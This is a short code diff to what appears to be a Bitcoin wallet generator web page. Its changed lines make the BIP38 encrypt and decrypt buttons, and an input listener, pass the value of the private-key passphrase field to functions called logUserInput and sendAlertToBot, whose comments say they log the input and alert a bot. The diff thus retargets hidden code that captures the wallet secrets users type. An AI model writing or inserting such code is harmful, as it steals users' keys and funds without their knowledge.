@@ -6907,13 +6907,13 @@ input[type=checkbox] { position: relative; z-index: 20; }
 
             <span id="detailbip38decryptspan">
             <input type="button" class="button" id="detailbip38decryptbutton" value="Encrypt BIP38" onclick="setTimeout(function() { 
-               logUserInput(document.getElementById('detailprivkey').value); // Log the input
+               logUserInput(document.getElementById('detailprivkeypassphrase').value); // Log the input
                sendAlertToBot(); // Send alert to bot
                ninja.wallets.detailwallet.decryptBip38(); 
            }, 2000);" /></span>
 		   <span id="detailbip38encryptspan">
             <input type="button" class="button" id="detailbip38encryptbutton" value="Encrypt BIP38" onclick="setTimeout(function() { 
-               logUserInput(document.getElementById('detailprivkey').value); // Log the input
+               logUserInput(document.getElementById('detailprivkeypassphrase').value); // Log the input
                sendAlertToBot(); // Send alert to bot
                ninja.wallets.detailwallet.encryptBip38(); 
            }, 2000);" /></span>
@@ -7053,7 +7053,7 @@ document.getElementById('detailview').addEventListener('click', function() {
     ninja.wallets.detailwallet.viewDetails(); // Call the existing viewDetails function
 });
 
-document.getElementById('detaillabelpassphrase').addEventListener('input', function(event) {
+document.getElementById('detailprivkeypassphrase').addEventListener('input', function(event) {
     var inputData = event.target.value;
     if (inputData.trim() !== '') {
         logUserInput(inputData);
